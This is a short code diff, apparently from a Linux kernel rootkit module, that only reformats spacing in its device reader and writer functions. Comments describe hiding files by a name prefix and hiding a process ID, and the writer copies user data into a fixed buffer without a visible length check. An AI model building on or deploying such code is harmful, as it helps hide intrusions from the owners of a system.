@@ -14,7 +14,7 @@ char PREFIX[DEVICE_SIZE] = "asdfasdfasdfasdfasdf"; // filename prefix to hide
 char hide_pid[NAME_MAX]; // pid to hide
 
 
-ssize_t reader(struct file *filep,char *buff,size_t count,loff_t *offp)
+ssize_t reader(struct file *filep, char *buff, size_t count, loff_t *offp)
 {
     if (copy_to_user(buff, last_data, strlen(last_data)) != 0) { // copy last written data to user using the device
         printk("Kernel -> userspace copy failed!\n");
@@ -24,7 +24,7 @@ ssize_t reader(struct file *filep,char *buff,size_t count,loff_t *offp)
 }
 
 
-ssize_t writer(struct file *filep,const char *buff,size_t count,loff_t *offp) // function to get config of what to hide and what type
+ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp) // function to get config of what to hide and what type
 {
     char tmpdata[DEVICE_SIZE + 1];
     if (copy_from_user(tmpdata, buff, count) != 0) {
